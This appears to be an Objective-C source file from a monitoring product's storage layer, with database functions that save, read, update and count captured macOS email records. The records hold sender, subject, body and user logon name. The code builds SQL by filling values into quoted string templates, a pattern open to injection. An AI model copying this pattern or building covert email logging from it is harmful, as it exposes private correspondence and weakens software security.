//
//  EmailMacOSDAO.m
//  FxSqLite
//
//  Created by Makara Khloth on 2/12/15.
//
//

#import "EmailMacOSDAO.h"
#import "FxEmailMacOSEvent.h"
#import "FxSqlString.h"
#import "DAOFunction.h"
#import "FxSqliteView.h"
#import "DetailedCount.h"

#import <sqlite3.h>

// Select/Insert/Delete/Update/Count email mac os table
static const NSString* kSelectEmailMacOSSql			= @"SELECT * FROM email_mac_os;";
static const NSString* kSelectWhereEmailMacOSSql	= @"SELECT * FROM email_mac_os WHERE id = ?;";
static const NSString* kInsertEmailMacOSSql			= @"INSERT INTO email_mac_os VALUES(NULL, '?', ?, '?', '?', '?', '?', ?, '?', '?', '?', '?');";
static const NSString* kDeleteEmailMacOSSql			= @"DELETE FROM email_mac_os WHERE id = ?;";
static const NSString* kUpdateEmailMacOSSql			= @"UPDATE email_mac_os SET time = '?',"
                                                        "direction = ?,"
                                                        "user_logon_name = '?',"
                                                        "application_id = '?',"
                                                        "application_name = '?',"
                                                        "title = '?',"
                                                        "service_type = ?,"
                                                        "sender_email = '?',"
                                                        "sender_name = '?',"
                                                        "subject = '?',"
                                                        "body = '?'"
                                                        " WHERE id = ?;";
static const NSString* kCountAllEmailMacOSSql		= @"SELECT Count(*) FROM email_mac_os;";
static const NSString* kCountDirectionEmailMacOSSql	= @"SELECT Count(*) FROM email_mac_os WHERE direction = ?;";

@implementation EmailMacOSDAO

- (id) initWithSQLite3: (sqlite3 *) aSQLite3 {
    if (self = [super init]) {
        mSQLite3 = aSQLite3;
    }
    return (self);
}

- (NSInteger) deleteEvent: (NSInteger) eventID {
    NSInteger numEventDeleted = 0;
    FxSqlString* sqlString = [[FxSqlString alloc] initWithSqlFormat:kDeleteEmailMacOSSql];
    [sqlString formatInt:eventID atIndex:0];
    const NSString* sqlStatement = [sqlString finalizeSqlString];
    [sqlString release];
    [DAOFunction execDML:mSQLite3 withSqlStatement:sqlStatement];
    numEventDeleted++;
    return (numEventDeleted);
}

- (NSInteger) insertEvent: (FxEvent*) newEvent {
    NSInteger numEventInserted = 0;
    FxEmailMacOSEvent* newEmailMacOSEvent = (FxEmailMacOSEvent*)newEvent;
    FxSqlString* sqlString = [[FxSqlString alloc] initWithSqlFormat:kInsertEmailMacOSSql];
    
    [sqlString formatString:newEmailMacOSEvent.dateTime atIndex:0];
    [sqlString formatInt:newEmailMacOSEvent.mDirection atIndex:1];
    [sqlString formatString:newEmailMacOSEvent.mUserLogonName atIndex:2];
    [sqlString formatString:newEmailMacOSEvent.mApplicationID atIndex:3];
    [sqlString formatString:newEmailMacOSEvent.mApplicationName atIndex:4];
    [sqlString formatString:newEmailMacOSEvent.mTitle atIndex:5];
    [sqlString formatInt:newEmailMacOSEvent.mEmailServiceType atIndex:6];
    [sqlString formatString:newEmailMacOSEvent.mSenderEmail atIndex:7];
    [sqlString formatString:newEmailMacOSEvent.mSenderName atIndex:8];
    [sqlString formatString:newEmailMacOSEvent.mSubject atIndex:9];
    [sqlString formatString:newEmailMacOSEvent.mBody atIndex:10];
    
    const NSString* sqlStatement = [sqlString finalizeSqlString];
    [sqlString release];
    [DAOFunction execDML:mSQLite3 withSqlStatement:sqlStatement];
    numEventInserted++;
    return (numEventInserted);
}

- (FxEvent*) selectEvent: (NSInteger) eventID {
    FxSqlString* sqlString = [[FxSqlString alloc] initWithSqlFormat:kSelectWhereEmailMacOSSql];
    [sqlString formatInt:eventID atIndex:0];
    
    const NSString* sqlStatement = [sqlString finalizeSqlString];
    [sqlString release];
    
    FxSqliteView* fxSqliteView = [DAOFunction execQuery:mSQLite3 withSqlStatement:sqlStatement];
    
    FxEmailMacOSEvent* newEmailMacOSEvent    = [[FxEmailMacOSEvent alloc] init];
    newEmailMacOSEvent.eventId               = [fxSqliteView intFieldValue:0];
    newEmailMacOSEvent.dateTime              = [fxSqliteView stringFieldValue:1];
    newEmailMacOSEvent.mDirection            = (FxEventDirection)[fxSqliteView intFieldValue:2];
    newEmailMacOSEvent.mUserLogonName        = [fxSqliteView stringFieldValue:3];
    newEmailMacOSEvent.mApplicationID        = [fxSqliteView stringFieldValue:4];
    newEmailMacOSEvent.mApplicationName      = [fxSqliteView stringFieldValue:5];
    newEmailMacOSEvent.mTitle                = [fxSqliteView stringFieldValue:6];
    newEmailMacOSEvent.mEmailServiceType     = (FxEmailServiceType)[fxSqliteView intFieldValue:7];
    newEmailMacOSEvent.mSenderEmail          = [fxSqliteView stringFieldValue:8];
    newEmailMacOSEvent.mSenderName           = [fxSqliteView stringFieldValue:9];
    newEmailMacOSEvent.mSubject              = [fxSqliteView stringFieldValue:10];
    newEmailMacOSEvent.mBody                 = [fxSqliteView stringFieldValue:11];
    
    [fxSqliteView done];
    [newEmailMacOSEvent autorelease];
    return (newEmailMacOSEvent);
}

- (NSArray*) selectMaxEvent: (NSInteger) maxEvent {
    NSMutableArray* eventArrays = [[NSMutableArray alloc] init];
    
    FxSqlString* sqlString = [[FxSqlString alloc] initWithSqlFormat:kSelectEmailMacOSSql];
    const NSString* sqlStatement = [sqlString finalizeSqlString];
    [sqlString release];
    
    FxSqliteView* fxSqliteView = [DAOFunction execQuery:mSQLite3 withSqlStatement:sqlStatement];
    NSInteger count = 0;
    
    while (count < maxEvent && !fxSqliteView.eof) {
        FxEmailMacOSEvent* newEmailMacOSEvent    = [[FxEmailMacOSEvent alloc] init];
        newEmailMacOSEvent.eventId               = [fxSqliteView intFieldValue:0];
        newEmailMacOSEvent.dateTime              = [fxSqliteView stringFieldValue:1];
        newEmailMacOSEvent.mDirection            = (FxEventDirection)[fxSqliteView intFieldValue:2];
        newEmailMacOSEvent.mUserLogonName        = [fxSqliteView stringFieldValue:3];
        newEmailMacOSEvent.mApplicationID        = [fxSqliteView stringFieldValue:4];
        newEmailMacOSEvent.mApplicationName      = [fxSqliteView stringFieldValue:5];
        newEmailMacOSEvent.mTitle                = [fxSqliteView stringFieldValue:6];
        newEmailMacOSEvent.mEmailServiceType     = (FxEmailServiceType)[fxSqliteView intFieldValue:7];
        newEmailMacOSEvent.mSenderEmail          = [fxSqliteView stringFieldValue:8];
        newEmailMacOSEvent.mSenderName           = [fxSqliteView stringFieldValue:9];
        newEmailMacOSEvent.mSubject              = [fxSqliteView stringFieldValue:10];
        newEmailMacOSEvent.mBody                 = [fxSqliteView stringFieldValue:11];
        
        [eventArrays addObject:newEmailMacOSEvent];
        [newEmailMacOSEvent release];
        count++;
        [fxSqliteView nextRow];
    }
    [fxSqliteView done];
    [eventArrays autorelease];
    return (eventArrays);
}

- (NSInteger) updateEvent: (FxEvent*) newEvent {
    NSInteger numEventUpdated = 0;
    FxSqlString* sqlString = [[FxSqlString alloc] initWithSqlFormat:kUpdateEmailMacOSSql];
    
    FxEmailMacOSEvent* newEmailMacOSEvent = (FxEmailMacOSEvent*)newEvent;
    [sqlString formatString:newEmailMacOSEvent.dateTime atIndex:0];
    [sqlString formatInt:newEmailMacOSEvent.mDirection atIndex:1];
    [sqlString formatString:newEmailMacOSEvent.mUserLogonName atIndex:2];
    [sqlString formatString:newEmailMacOSEvent.mApplicationID atIndex:3];
    [sqlString formatString:newEmailMacOSEvent.mApplicationName atIndex:4];
    [sqlString formatString:newEmailMacOSEvent.mTitle atIndex:5];
    [sqlString formatInt:newEmailMacOSEvent.mEmailServiceType atIndex:6];
    [sqlString formatString:newEmailMacOSEvent.mSenderEmail atIndex:7];
    [sqlString formatString:newEmailMacOSEvent.mSenderName atIndex:8];
    [sqlString formatString:newEmailMacOSEvent.mSubject atIndex:9];
    [sqlString formatString:newEmailMacOSEvent.mBody atIndex:10];
    [sqlString formatInt:newEmailMacOSEvent.eventId atIndex:11];
    
    const NSString* sqlStatement = [sqlString finalizeSqlString];
    [sqlString release];
    [DAOFunction execDML:mSQLite3 withSqlStatement:sqlStatement];
    numEventUpdated++;
    return (numEventUpdated);
}

- (DetailedCount*) countEvent {
    DetailedCount* detailedCount = [[DetailedCount alloc] init];
    
    // Total count
    detailedCount.totalCount = [DAOFunction execScalar:mSQLite3 withSqlStatement:kCountAllEmailMacOSSql];
    
    // In count
    FxSqlString* sqlString = [[FxSqlString alloc] initWithSqlFormat:kCountDirectionEmailMacOSSql];
    [sqlString formatInt:kEventDirectionIn atIndex:0];
    NSString* sqlStatement = [sqlString finalizeSqlString];
    [sqlString release];
    detailedCount.inCount = [DAOFunction execScalar:mSQLite3 withSqlStatement:sqlStatement];
    
    // Out count
    sqlString = [[FxSqlString alloc] initWithSqlFormat:kCountDirectionEmailMacOSSql];
    [sqlString formatInt:kEventDirectionOut atIndex:0];
    sqlStatement = [sqlString finalizeSqlString];
    [sqlString release];
    detailedCount.outCount = [DAOFunction execScalar:mSQLite3 withSqlStatement:sqlStatement];
    
    // Missed count
    sqlString = [[FxSqlString alloc] initWithSqlFormat:kCountDirectionEmailMacOSSql];
    [sqlString formatInt:kEventDirectionMissedCall atIndex:0];
    sqlStatement = [sqlString finalizeSqlString];
    [sqlString release];
    detailedCount.missedCount = [DAOFunction execScalar:mSQLite3 withSqlStatement:sqlStatement];
    
    // Unknown count
    sqlString = [[FxSqlString alloc] initWithSqlFormat:kCountDirectionEmailMacOSSql];
    [sqlString formatInt:kEventDirectionUnknown atIndex:0];
    sqlStatement = [sqlString finalizeSqlString];
    [sqlString release];
    detailedCount.unknownCount = [DAOFunction execScalar:mSQLite3 withSqlStatement:sqlStatement];
    
    // Local IM count
    sqlString = [[FxSqlString alloc] initWithSqlFormat:kCountDirectionEmailMacOSSql];
    [sqlString formatInt:kEventDirectionLocalIM atIndex:0];
    sqlStatement = [sqlString finalizeSqlString];
    [sqlString release];
    detailedCount.localIMCount = [DAOFunction execScalar:mSQLite3 withSqlStatement:sqlStatement];
    
    [detailedCount autorelease];
    return (detailedCount);
}

- (void) dealloc {
    [super dealloc];
}

@end
